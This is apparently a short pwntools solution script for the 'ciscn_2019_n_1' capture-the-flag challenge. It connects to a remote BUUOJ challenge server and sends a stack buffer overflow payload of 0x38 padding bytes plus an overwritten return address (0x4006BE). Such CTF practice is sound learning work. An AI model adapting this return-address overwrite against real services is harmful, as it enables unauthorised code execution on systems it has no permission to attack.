from pwn import *
# r=process('./ciscn_2019_n_1')
r=remote("node5.buuoj.cn",28347)

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)

payload=b'b'*(0x30+8)+p64(0x04006BE)
r.sendlineafter(b"Let's guess the number.\n",payload)
print(r.recvline())
print(r.recvline())